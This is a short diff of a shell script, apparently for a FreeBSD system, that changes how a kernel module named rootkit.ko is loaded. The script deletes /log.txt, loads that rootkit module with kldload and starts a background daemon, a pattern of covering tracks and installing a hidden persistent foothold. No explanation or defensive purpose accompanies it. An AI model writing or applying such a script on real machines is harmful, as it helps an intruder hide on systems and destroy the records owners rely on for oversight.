@@ -1,5 +1,5 @@
 #!/bin/sh
 
 rm /log.txt
-kldload /boot/kernel/rootkit.ko
+/sbin/kldload /boot/kernel/rootkit.ko
 /lib/daemon yeet &
